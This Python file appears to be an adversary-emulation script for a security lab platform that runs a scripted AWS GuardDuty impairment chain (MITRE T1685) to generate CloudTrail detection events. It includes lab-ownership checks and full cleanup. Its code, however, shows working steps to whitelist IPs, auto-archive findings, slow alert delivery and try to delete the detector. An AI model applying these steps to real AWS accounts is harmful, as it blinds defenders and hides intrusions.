# FILE: attack.py
"""
ATOMIC-guardduty-impair -- Automated Post-Exploitation Attack Script
T1685: Disable or Modify Tools (Defense Evasion)

3-phase attack chain:
  Phase 1 - Credential Acquisition and Discovery (Steps 1-2)
  Phase 2 - GuardDuty Impairment (Steps 3-8)
  Phase 3 - Cleanup / State Restore (Step 9)
"""
import sys
import time
import random
import json
import pathlib
import boto3
from botocore.exceptions import ClientError

# Cross-platform UTF-8 output - prevents UnicodeEncodeError on Windows CP1252 terminals
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")

# ---------------------------------------------------------------------------
# Resource names: single source of truth
# resource_names.json lives at infra/resource_names.json (sibling of attack.py)
# ---------------------------------------------------------------------------
_NAMES_FILE = pathlib.Path(__file__).parent / "infra" / "resource_names.json"
if _NAMES_FILE.exists():
    _NAMES = json.loads(_NAMES_FILE.read_text(encoding="utf-8"))
else:
    _NAMES = {"resources": {}, "pulumi_export_keys": {}}
    print(f"[!] resource_names.json not found at {_NAMES_FILE} -- falling back to raw output keys")

_R   = _NAMES.get("resources", {})           # static names (IAM role names, log group names, ...)
_PKS = _NAMES.get("pulumi_export_keys", {})  # semantic key -> pulumi export key (dynamic values)


_TENANT_CREDS = {}


def _set_tenant_credentials(outputs):
    """Remember the tenant's short-lived credentials. In the MayaTrail backend the
    worker injects them as outputs['_aws_credentials']; without this the first STS
    call would run as the Celery worker identity instead of the tenant account."""
    _TENANT_CREDS.clear()
    _TENANT_CREDS.update((outputs or {}).get("_aws_credentials") or {})


def _base_session(region):
    """Session for the tenant's connected role, or the ambient default session for
    standalone runs where no credentials were injected."""
    if _TENANT_CREDS:
        return boto3.Session(
            aws_access_key_id=_TENANT_CREDS.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=_TENANT_CREDS.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=_TENANT_CREDS.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _r(key, default=""):
    """Resolve a static resource name from resource_names.json['resources']."""
    return _R.get(key, default)


def _p(outputs, key, default=""):
    """Resolve a dynamic value: translate semantic key via pulumi_export_keys, then read from outputs."""
    export_key = _PKS.get(key, key)
    val = outputs.get(export_key)
    return val if val is not None else default


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def print_step(msg):
    print(f"\n[*] {msg}")


def print_ok(msg):
    print(f"[+] {msg}")


def print_err(msg):
    print(f"[-] {msg}")


def print_warn(msg):
    print(f"[!] {msg}")


def op_delay(min_s=2, max_s=6):
    time.sleep(random.uniform(min_s, max_s))


def phase_delay():
    time.sleep(random.uniform(5, 15))


# ---------------------------------------------------------------------------
# Entry point (backend contract)
# ---------------------------------------------------------------------------

def run(outputs: dict, region: str = "us-east-1") -> None:
    # ── Required dynamic outputs (via _p so pulumi_export_keys remapping applies) ─
    _set_tenant_credentials(outputs)

    attacker_role_arn = _p(outputs, "attacker_role_arn")
    if not attacker_role_arn:
        raise RuntimeError("Missing required output: attacker_role_arn")

    detector_id = _p(outputs, "detector_id")
    if not detector_id:
        raise RuntimeError("Missing required output: detector_id")

    trusted_ip_bucket_name = _p(outputs, "trusted_ip_bucket_name")
    if not trusted_ip_bucket_name:
        raise RuntimeError("Missing required output: trusted_ip_bucket_name")

    # Safety flag: if False (or absent), the detector belongs to the client account
    _raw_flag = _p(outputs, "detector_is_lab_owned", None)
    if _raw_flag is None:
        detector_is_lab_owned = False
    elif isinstance(_raw_flag, bool):
        detector_is_lab_owned = _raw_flag
    else:
        detector_is_lab_owned = str(_raw_flag).lower() == "true"

    # Static names (from resource_names.json['resources'] where applicable)
    attacker_role_name = _r("attacker_role_name", "atomic-guardduty-impair-attacker-role")

    # Attack-created artifact names (not in resource_names.json - attacker-chosen names)
    IPSET_NAME  = "prod-trusted-ips"
    FILTER_NAME = "lab-archive-filter"

    # ── Attack-state variables (for cleanup tracking in finally block) ────────
    ipset_id          = None
    filter_created    = False
    detector_degraded = False
    s3_staged         = False
    original_frequency = "ONE_HOUR"

    print_step("ATOMIC-guardduty-impair -- T1685 Defense Evasion: Disable or Modify Tools")
    print(f"    attacker_role:      {attacker_role_name}")
    print(f"    attacker_role_arn:  {attacker_role_arn}")
    print(f"    detector_id:        {detector_id}")
    print(f"    detector_lab_owned: {detector_is_lab_owned}")
    print(f"    trusted_ip_bucket:  {trusted_ip_bucket_name}")
    print(f"    region:             {region}")

    # =========================================================================
    # PHASE 1 -- Credential Acquisition and Discovery
    # =========================================================================
    print_step("PHASE 1 - Credential Acquisition and Discovery")

    # ------------------------------------------------------------------
    # Step 1: AssumeRole into the seeded attacker role
    # Tradecraft: real APT with stolen creds pivots via AssumeRole to gain
    # a scoped session and avoid using the primary credential for noisy ops.
    # ------------------------------------------------------------------
    print_step("Step 1 [T1685]: AssumeRole into attacker role (credential pivot)")
    base_sts = _base_session(region).client("sts")
    try:
        assumed = base_sts.assume_role(
            RoleArn=attacker_role_arn,
            RoleSessionName="AtomicT1685GuardDutyImpair",
        )
    except ClientError as e:
        raise RuntimeError(f"AssumeRole failed: {e}") from e

    creds = assumed["Credentials"]
    attacker_session = boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )
    print_ok(f"AssumeRole -> {assumed['AssumedRoleUser']['Arn']}")

    op_delay(2, 4)

    attacker_sts = attacker_session.client("sts")
    try:
        identity = attacker_sts.get_caller_identity()
        print_ok(
            f"GetCallerIdentity -> Account:{identity['Account']} "
            f"UserId:{identity['UserId']}"
        )
    except ClientError as e:
        raise RuntimeError(f"GetCallerIdentity failed: {e}") from e

    op_delay(2, 4)

    # ------------------------------------------------------------------
    # Step 2: Enumerate GuardDuty detector
    # Tradecraft: attacker enumerates GD to confirm scope and capture the
    # current publishing frequency for later restoration (covering tracks).
    # NOTE: detector_id is read from stack outputs (lab-owned resource) -
    # never take the first item of list_detectors() to avoid touching a
    # client-account detector that wasn't provisioned by the lab stack.
    # ------------------------------------------------------------------
    print_step("Step 2 [T1685]: Enumerate GuardDuty detector (ListDetectors + GetDetector)")
    gd = attacker_session.client("guardduty", region_name=region)

    try:
        list_resp = gd.list_detectors()
        found_ids = list_resp.get("DetectorIds", [])
        print_ok(f"ListDetectors -> {len(found_ids)} detector(s) in region")
    except ClientError as e:
        raise RuntimeError(f"ListDetectors failed: {e}") from e

    op_delay(2, 4)

    try:
        det_resp = gd.get_detector(DetectorId=detector_id)
        original_frequency = det_resp.get("FindingPublishingFrequency", "ONE_HOUR")
        print_ok(
            f"GetDetector -> status:{det_resp.get('Status')} "
            f"frequency:{original_frequency}"
        )
    except ClientError as e:
        raise RuntimeError(f"GetDetector failed: {e}") from e

    phase_delay()

    # =========================================================================
    # PHASE 2 -- GuardDuty Impairment
    # =========================================================================
    print_step("PHASE 2 - GuardDuty Impairment")

    # Client-account safety: if the detector is not lab-owned, only the S3
    # staging step (against a lab-owned bucket) is safe; skip all detector
    # modification steps (steps 4-8).
    if not detector_is_lab_owned:
        print_warn(
            "detector_is_lab_owned=False -- detector belongs to client account; "
            "skipping all modification steps (Steps 4-8). Performing S3 stage only."
        )
        s3 = attacker_session.client("s3", region_name=region)
        try:
            print_step("Step 3 [T1685]: Stage trusted-IP artifact (bucket is lab-owned)")
            s3.put_object(
                Bucket=trusted_ip_bucket_name,
                Key="trusted_ip_list.txt",
                Body="192.0.2.0/24\n",
            )
            s3_staged = True
            print_ok(
                f"PutObject s3://{trusted_ip_bucket_name}/trusted_ip_list.txt "
                "-> 192.0.2.0/24 (RFC 5737 TEST-NET-1)"
            )
        except ClientError as e:
            print_err(f"PutObject failed: {e}")

        phase_delay()
        print_step("PHASE 3 - Cleanup (partial - detector modification skipped)")
        if s3_staged:
            try:
                s3.delete_object(
                    Bucket=trusted_ip_bucket_name,
                    Key="trusted_ip_list.txt",
                )
                s3_staged = False
                print_ok(
                    f"DeleteObject s3://{trusted_ip_bucket_name}/trusted_ip_list.txt"
                )
            except ClientError as e:
                print_err(f"DeleteObject failed: {e}")

        _print_summary(
            detector_id, ipset_id, filter_created, detector_degraded, s3_staged
        )
        return

    # detector_is_lab_owned=True: full attack chain with guaranteed cleanup
    s3 = attacker_session.client("s3", region_name=region)

    try:
        # ------------------------------------------------------------------
        # Step 3: Stage trusted-IP artifact in S3
        # Tradecraft: attacker uploads a CIDR list to a bucket they control or
        # have compromised, then points GuardDuty at it via CreateIPSet.
        # Using RFC 5737 TEST-NET-1 (192.0.2.0/24) -- never routes, safe.
        # ------------------------------------------------------------------
        print_step(
            "Step 3 [T1685]: Stage trusted-IP artifact "
            f"(s3://{trusted_ip_bucket_name}/trusted_ip_list.txt)"
        )
        try:
            s3.put_object(
                Bucket=trusted_ip_bucket_name,
                Key="trusted_ip_list.txt",
                Body="192.0.2.0/24\n",
            )
            s3_staged = True
            print_ok(
                f"PutObject s3://{trusted_ip_bucket_name}/trusted_ip_list.txt "
                "-> 192.0.2.0/24 (RFC 5737 TEST-NET-1, non-routable)"
            )
        except ClientError as e:
            print_err(f"PutObject failed (non-fatal, continuing): {e}")

        op_delay(2, 4)

        # ------------------------------------------------------------------
        # Step 4: Create GuardDuty IPSet (trusted-IP whitelist) and activate
        # Tradecraft: IPSet suppresses findings for traffic sourced from listed
        # CIDRs -- attacker whitelists C2 infrastructure to blind detection.
        # ------------------------------------------------------------------
        print_step(
            f"Step 4 [T1685]: Create GuardDuty IPSet '{IPSET_NAME}' "
            "(Activate=True -- suppresses findings from listed CIDRs)"
        )
        ip_list_location = f"s3://{trusted_ip_bucket_name}/trusted_ip_list.txt"
        try:
            ipset_resp = gd.create_ip_set(
                DetectorId=detector_id,
                Name=IPSET_NAME,
                Format="TXT",
                Location=ip_list_location,
                Activate=True,
            )
            ipset_id = ipset_resp.get("IpSetId")
            print_ok(
                f"CreateIPSet -> IpSetId:{ipset_id} "
                f"Location:{ip_list_location}"
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                print_err(
                    f"CreateIPSet AccessDenied -- guardduty:CreateIPSet may not be in "
                    f"attacker Allow policy: {e}"
                )
            else:
                print_err(f"CreateIPSet failed ({code}): {e}")

        op_delay(3, 6)

        # ------------------------------------------------------------------
        # Step 5: Create suppression filter (Action=ARCHIVE)
        # Tradecraft: ARCHIVE filter auto-archives matching findings before an
        # analyst sees them -- effective silent suppression inside GuardDuty.
        # Scoped to tag key=LabOwned to avoid archiving real production findings.
        # ------------------------------------------------------------------
        print_step(
            f"Step 5 [T1685]: Create suppression filter '{FILTER_NAME}' "
            "(Action=ARCHIVE, tag key=LabOwned)"
        )
        try:
            gd.create_filter(
                DetectorId=detector_id,
                Name=FILTER_NAME,
                Action="ARCHIVE",
                Rank=1,
                FindingCriteria={
                    "Criterion": {
                        "resource.tags.key": {
                            "Eq": ["LabOwned"],
                        },
                    },
                },
            )
            filter_created = True
            print_ok(
                f"CreateFilter -> '{FILTER_NAME}' Action=ARCHIVE Rank=1 "
                "criterion:resource.tags.key=LabOwned"
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                print_err(f"CreateFilter AccessDenied: {e}")
            else:
                print_err(f"CreateFilter failed ({code}): {e}")

        op_delay(2, 5)

        # ------------------------------------------------------------------
        # Step 6: Degrade detector FindingPublishingFrequency to SIX_HOURS
        # Tradecraft: reduces alert velocity -- findings still generated
        # internally but EventBridge/SNS delivery delayed 6x, giving a real
        # attacker a longer dwell window before on-call is paged.
        # ------------------------------------------------------------------
        print_step(
            "Step 6 [T1685]: Degrade detector FindingPublishingFrequency "
            f"SIX_HOURS (was {original_frequency})"
        )
        try:
            gd.update_detector(
                DetectorId=detector_id,
                FindingPublishingFrequency="SIX_HOURS",
            )
            detector_degraded = True
            print_ok(
                f"UpdateDetector -> FindingPublishingFrequency:SIX_HOURS "
                f"(was {original_frequency})"
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                print_err(f"UpdateDetector AccessDenied: {e}")
            else:
                print_err(f"UpdateDetector failed ({code}): {e}")

        op_delay(2, 5)

        # ------------------------------------------------------------------
        # Step 7: Attempt DeleteDetector (deny-guarded -- expect AccessDenied)
        # Tradecraft: advanced attacker with guardduty:* scope attempts full
        # destruction. IAM explicit Deny on guardduty:DeleteDetector means this
        # is refused but STILL logged in CloudTrail -- high-confidence IOC.
        # Detection rules MUST NOT filter on errorCode IS NULL.
        # ------------------------------------------------------------------
        print_step(
            "Step 7 [T1685]: Attempt DeleteDetector "
            "(deny-guarded -- expect AccessDenied CloudTrail IOC)"
        )
        try:
            gd.delete_detector(DetectorId=detector_id)
            # IAM explicit Deny should prevent success; if it ever lands here,
            # the deny guard has failed -- raise immediately (no undo needed
            # because the detector was destroyed, which requires pulumi re-deploy).
            print_err("CRITICAL: DeleteDetector succeeded -- IAM Deny guard failed")
            raise RuntimeError(
                "DeleteDetector succeeded unexpectedly -- "
                "IAM Deny on guardduty:DeleteDetector did not fire. "
                "Lab infrastructure safety issue; investigate the attacker role policy."
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                print_ok(
                    "DeleteDetector -> AccessDenied (expected -- IAM Deny guard working) "
                    "CloudTrail IOC logged"
                )
            else:
                print_err(f"DeleteDetector unexpected error ({code}): {e}")

        op_delay(2, 5)

        # ------------------------------------------------------------------
        # Step 8: Attempt DeletePublishingDestination (implicit deny)
        # Tradecraft: attacker tries to blind log export.
        # guardduty:DeletePublishingDestination is NOT in the Allow policy --
        # implicit deny. IAM authorization is evaluated before resource
        # existence, so AccessDenied fires even with a placeholder DestinationId.
        # ------------------------------------------------------------------
        print_step(
            "Step 8 [T1685]: Attempt DeletePublishingDestination "
            "(implicit deny -- expect AccessDenied CloudTrail IOC)"
        )
        PLACEHOLDER_DEST_ID = "00000000-0000-0000-0000-000000000000"
        try:
            gd.delete_publishing_destination(
                DetectorId=detector_id,
                DestinationId=PLACEHOLDER_DEST_ID,
            )
            # Should never succeed -- implicit IAM deny
            raise RuntimeError(
                "DeletePublishingDestination succeeded unexpectedly -- "
                "guardduty:DeletePublishingDestination should be implicitly denied. "
                "Lab infrastructure safety issue; investigate the attacker role policy."
            )
        except ClientError as e:
            code = e.response["Error"]["Code"]
            if code in ("AccessDeniedException", "AccessDenied"):
                print_ok(
                    "DeletePublishingDestination -> AccessDenied (expected -- implicit IAM deny) "
                    "CloudTrail IOC logged"
                )
            else:
                print_err(f"DeletePublishingDestination unexpected error ({code}): {e}")

        op_delay(2, 5)

    finally:
        # =====================================================================
        # PHASE 3 -- Cleanup: restore pre-attack state
        # Runs unconditionally via finally to prevent leaving modified state
        # in a client account on mid-run failure.
        # =====================================================================
        phase_delay()
        print_step("PHASE 3 - Cleanup: Restoring pre-attack GuardDuty state")

        # Step 9a: Restore detector FindingPublishingFrequency
        if detector_degraded:
            try:
                gd.update_detector(
                    DetectorId=detector_id,
                    FindingPublishingFrequency=original_frequency,
                )
                detector_degraded = False
                print_ok(
                    f"UpdateDetector (restore) -> "
                    f"FindingPublishingFrequency:{original_frequency}"
                )
            except ClientError as e:
                print_err(f"UpdateDetector restore failed: {e}")
            op_delay(2, 4)

        # Step 9b: Delete archive filter
        if filter_created:
            try:
                gd.delete_filter(
                    DetectorId=detector_id,
                    FilterName=FILTER_NAME,
                )
                filter_created = False
                print_ok(f"DeleteFilter -> '{FILTER_NAME}' removed")
            except ClientError as e:
                print_err(f"DeleteFilter failed: {e}")
            op_delay(2, 4)

        # Step 9c: Delete IPSet
        if ipset_id:
            try:
                gd.delete_ip_set(
                    DetectorId=detector_id,
                    IpSetId=ipset_id,
                )
                print_ok(f"DeleteIPSet -> {ipset_id} removed")
                ipset_id = None
            except ClientError as e:
                print_err(f"DeleteIPSet failed: {e}")
            op_delay(2, 4)

        # Step 9d: Remove staged S3 object
        if s3_staged:
            try:
                s3.delete_object(
                    Bucket=trusted_ip_bucket_name,
                    Key="trusted_ip_list.txt",
                )
                s3_staged = False
                print_ok(
                    f"DeleteObject s3://{trusted_ip_bucket_name}/trusted_ip_list.txt"
                )
            except ClientError as e:
                print_err(f"DeleteObject failed: {e}")

    _print_summary(
        detector_id, ipset_id, filter_created, detector_degraded, s3_staged
    )


def _print_summary(
    detector_id, ipset_id, filter_created, detector_degraded, s3_staged
):
    print("\n" + "=" * 60)
    print("ATOMIC-guardduty-impair -- Attack Summary")
    print("=" * 60)
    print(f"Detector ID:         {detector_id}")
    print("")
    print("CloudTrail events generated (expected):")
    print("  [Step 1] AssumeRole                    sts.amazonaws.com")
    print("  [Step 1] GetCallerIdentity              sts.amazonaws.com")
    print("  [Step 2] ListDetectors                  guardduty.amazonaws.com")
    print("  [Step 2] GetDetector                    guardduty.amazonaws.com")
    print("  [Step 4] CreateIPSet                    guardduty.amazonaws.com")
    print("  [Step 5] CreateFilter (ARCHIVE)         guardduty.amazonaws.com")
    print("  [Step 6] UpdateDetector (degrade)       guardduty.amazonaws.com")
    print("  [Step 7] DeleteDetector (AccessDenied)  guardduty.amazonaws.com  <- IOC")
    print("  [Step 8] DeletePublishingDest (AccDen)  guardduty.amazonaws.com  <- IOC")
    print("  [Step 9] UpdateDetector (restore)       guardduty.amazonaws.com")
    print("  [Step 9] DeleteFilter                   guardduty.amazonaws.com")
    print("  [Step 9] DeleteIPSet                    guardduty.amazonaws.com")
    print("")
    print("Residual state (should all be False after clean run):")
    print(f"  IPSet remaining:      {ipset_id is not None}")
    print(f"  Filter remaining:     {filter_created}")
    print(f"  Detector degraded:    {detector_degraded}")
    print(f"  S3 object remaining:  {s3_staged}")
    print("=" * 60)
